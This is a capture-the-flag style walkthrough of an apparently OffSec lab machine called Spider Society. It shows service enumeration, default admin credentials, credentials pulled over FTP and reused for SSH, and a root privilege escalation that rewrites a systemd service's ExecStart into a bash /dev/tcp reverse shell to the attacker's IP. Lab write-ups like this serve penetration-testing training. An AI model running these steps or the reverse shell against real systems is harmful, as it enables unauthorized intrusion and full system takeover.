---
title: Spider Society PGP walkthrough
description: Target - Spider Society, OS - Linux, Difficulty - Hard
date: 11-14-2025
readTime: 15 min read
image: ../assets/images/Ss/Control-Panel.png
---

 ## ***Enumeration***

Gather information about the target  network, systems, services, open ports with nmap

```
nmap -sVC -n -T4 --open -Pn -oN spidersoc 192.168.104.214

Nmap scan report for 192.168.104.214
Host is up (0.32s latency).
Not shown: 969 filtered tcp ports (no-response), 28 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Spider Society
2121/tcp open  ftp     vsftpd 3.0.5
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 17 07:49:02 2025 -- 1 IP address (1 host up) scanned in 36.42 seconds
```

Only 2 of the TCP ports were in open state. Hence started to fuzz the website on port 80 using Ffuf

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u "http://192.168.104.214/FUZZ" -ac -t 200 --fc 403,404 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.104.214/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,404
________________________________________________

images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 321ms]
:: Progress: [26583/26583] :: Job [1/1] :: 132 req/sec :: Duration: [0:01:06] :: Errors: 80 ::
```

After fuzzing found `images` and  `libspider` directory. The libspider looked as a interesting path.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u "http://192.168.192.214/FUZZ" -ac -t 200 --fc 403,404 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.192.214/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,404
________________________________________________

images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1292ms]

libspider               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 314ms]

[WARN] Caught keyboard interrupt (Ctrl-C)
```


-----------
# *Initial Access*

Discovered a control panel at /libspider 

![Control-Panel](/1dragon/assets/images/Ss/Control-Panel.png)

Logged in with creds `admin:admin` and that worked

![Admin-panel](/1dragon/assets/images/Ss/admin-panel.png)

Clicked on communications and that displayed credentials for FTP.

![FTP-Creds](/1dragon/assets/images/Ss/FTP-Creds.png)

```
ftp ss_ftpbckuser@spidersociety.offsec.lab -p 2121
```

![](/1dragon/assets/images/Ss/ftp-login.png)

Moved into the libspider directory and downloaded all the files

```
cd libspider
prompt off
mget *
```

![](/1dragon/assets/images/Ss/get-files.png)

One of the files from the ftp looked interesting and that actually contained a link, directory path for credentials file.

![](/1dragon/assets/images/Ss/fetch-creds.png)

Accessed the link and discovered another set of credentials for DB as it says.

![link.png](/1dragon/assets/images/Ss/link.png)

Here it could be also the same password used for SSH hence, re-used the credential for SSH login.

Validated the newly found credentials for SSH using nxc.

![](/1dragon/assets/images/Ss/nxc-ssh.png)

```
nxc ssh  spidersociety.offsec.lab -u spidey -p 'WithGreatPowerComesGreatSecurity99!' 

SSH         192.168.192.214 22     spidersociety.offsec.lab [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11

SSH         192.168.192.214 22     spidersociety.offsec.lab [+] spidey:WithGreatPowerComesGreatSecurity99!  Linux - Shell access!
```

That worked. Logged into the target via ssh as spidey user

`ssh  spidey@spidersociety.offsec.lab`

![](/1dragon/assets/images/Ss/spidey-shell.png)

Captured the local.txt

---

# *Privilege Escalation*

After logging in as spidey looked for escalation vectors.

Spidey user can run the following services as root user.
```
spidey@spidersociety:~$ sudo -l
Matching Defaults entries for spidey on spidersociety:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```

Analyzed the `spiderback.service` contents and discovered that it is a systemctl file.

```
spidey@spidersociety:~$ systemctl cat spiderbackup.service
# /etc/systemd/system/spiderbackup.service
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target

```

Modified the ExecStart as a bash reverse-shell to connect back to local.

```
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.45.153/4444 0>&1"
User=root
Group=root

[Install]
WantedBy=multi-user.target

```

To update the chages made `daemon-reload` was executed and then the `restart spiderbackup.service` was executed.

```
spidey@spidersociety:/usr/local/bin$ sudo /bin/systemctl daemon-reload
spidey@spidersociety:/usr/local/bin$ sudo /bin/systemctl restart spiderbackup.service
```

Had a netcat listener at local port 4444. And Reverse shell connected back as root user after the restart of service was done.

![](/1dragon/assets/images/Ss/root.png)

The root.txt was captured under `/root/root.txt`

---


										Target compromised - |^| ^ ( |< 3 D

